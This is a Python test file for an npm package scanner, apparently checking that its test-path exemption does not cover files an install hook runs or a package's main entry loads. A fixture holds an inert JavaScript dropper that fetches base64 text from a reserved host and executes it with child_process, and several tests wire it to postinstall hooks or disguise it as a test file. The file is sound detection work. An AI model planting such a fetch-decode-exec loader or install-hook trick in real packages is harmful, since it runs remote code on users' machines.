"""A composite's test-path exemption reads a package's file where it sits in the package (review 98
P2): `tests/**` matches `package/tests/a.js` inside a tarball, which the root-anchored globs never
did, and never covers a file an install hook runs or a consumer's `require()` loads."""

from __future__ import annotations

from unit.foundation.test_npm_work_half_classes import Npm

CP = "child_" + "process"
#: Fetches a value, decodes it and runs it: `SUSPECT.DROPPER.001`, whose `unless` exempts
#: `tests/**`. Inert: the host is reserved and nothing here is executed.
CODE = (
    f"const c = require('{CP}');\n"
    "async function go() {\n"
    "  const r = await fetch('https://example.invalid/x');\n"
    "  const s = Buffer.from(await r.text(), 'base64').toString();\n"
    "  c.exec(s);\n"
    "}\nmodule.exports = go;\n"
)
RULE = "SUSPECT.DROPPER.001"


class TestTestPathsInsideAPackage:
    def test_the_shape_fires_in_the_package_code(self, tmp_path) -> None:
        pkg = Npm.build(
            tmp_path,
            "demo-fetch",
            {"version": "1.0.0", "main": "index.js"},
            {"index.js": "module.exports = 1;\n", "lib/run.js": CODE},
        )
        assert RULE in Npm.findings(pkg)

    def test_a_test_file_inside_the_tarball_is_exempt(self, tmp_path) -> None:
        pkg = Npm.build(
            tmp_path,
            "demo-fetch",
            {"version": "1.0.0", "main": "index.js"},
            {"index.js": "module.exports = 1;\n", "tests/run.js": CODE},
        )
        assert RULE not in Npm.findings(pkg)

    def test_a_test_folder_file_the_install_hook_runs_is_not(self, tmp_path) -> None:
        pkg = Npm.build(
            tmp_path,
            "demo-fetch",
            {
                "version": "1.0.0",
                "main": "index.js",
                "scripts": {"postinstall": "node tests/run.js"},
            },
            {"index.js": "module.exports = 1;\n", "tests/run.js": CODE + "go();\n"},
        )
        assert RULE in Npm.findings(pkg) or "MALWARE.DROPPER.001" in Npm.findings(pkg)

    def test_a_test_folder_file_that_is_the_package_main_is_not(self, tmp_path) -> None:
        pkg = Npm.build(
            tmp_path,
            "demo-fetch",
            {"version": "1.0.0", "main": "tests/run.js"},
            {"tests/run.js": CODE},
        )
        assert RULE in Npm.findings(pkg)

    def test_a_test_named_file_the_install_hook_runs_is_not_exempt(self, tmp_path) -> None:
        # `**/*.test.*` matched before this change too: a hook naming its payload `x.test.js`
        # was enough to be exempted.
        pkg = Npm.build(
            tmp_path,
            "demo-fetch",
            {
                "version": "1.0.0",
                "main": "index.js",
                "scripts": {"postinstall": "node check.test.js"},
            },
            {"index.js": "module.exports = 1;\n", "check.test.js": CODE + "go();\n"},
        )
        found = Npm.findings(pkg)
        assert RULE in found or "MALWARE.DROPPER.001" in found
